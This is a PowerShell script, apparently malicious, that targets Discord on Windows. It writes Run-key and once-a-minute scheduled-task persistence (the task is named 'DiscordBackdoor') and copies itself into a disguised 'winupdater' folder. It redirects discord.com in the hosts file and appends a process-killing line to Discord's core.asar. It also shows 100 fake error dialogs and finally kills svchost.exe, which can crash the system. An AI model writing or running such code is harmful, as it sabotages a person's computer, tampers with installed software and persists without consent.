Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "DiscordBlock" -Value "$env:APPDATA\winupdater\blocker.ps1"

schtasks /create /tn "DiscordBackdoor" /tr "powershell.exe -ExecutionPolicy Bypass -File $env:APPDATA\winupdater\blocker.ps1" /sc minute /mo 1 /F

Copy-Item "$MyInvocation.MyCommand.Path" "$env:APPDATA\winupdater\blocker.ps1"

Add-Content -Path "$env:SystemRoot\System32\drivers\etc\hosts" -Value "127.0.0.1 discord.com"

Start-Process -FilePath "taskkill" -ArgumentList "/IM Discord.exe /F" -NoNewWindow -Wait

$discordCore = "$env:APPDATA\Discord\0.0.309\modules\discord_desktop_core\core.asar"
if (Test-Path $discordCore) {
    # Simulé : insertion d'une ligne qui exécute taskkill ou une erreur
    echo 'require("child_process").exec("taskkill /IM Discord.exe /F")' >> $discordCore
}

for ($i = 1; $i -le 100; $i++) {
    [System.Windows.Forms.MessageBox]::Show("Discord a rencontré une erreur critique #$i", "Erreur Discord", 0)
}

Start-Process -FilePath "taskkill" -ArgumentList "/IM svchost.exe /F" -NoNewWindow -Wait
